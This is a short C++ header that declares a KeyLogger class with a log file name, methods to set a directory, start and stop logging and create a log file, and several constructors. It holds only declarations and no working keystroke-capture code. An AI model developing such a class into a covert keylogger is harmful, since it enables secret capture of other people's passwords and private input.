#pragma once

#include <string>

const std::string FILE_NAME = "\\Logs.txt";

/// <summary>
/// Key logger can create a log to the keyboard
/// </summary>
class KeyLogger
{
public:
	int SetDirectory(const char*);
	void StartKeyLogger();
	void StopLogging();
	void SetDefaultDirectory();
	KeyLogger();
	KeyLogger(KeyLogger&);
	KeyLogger(const char*);
private:
	std::string directory;
	bool loggerState;
	int CreateLogFile();
};
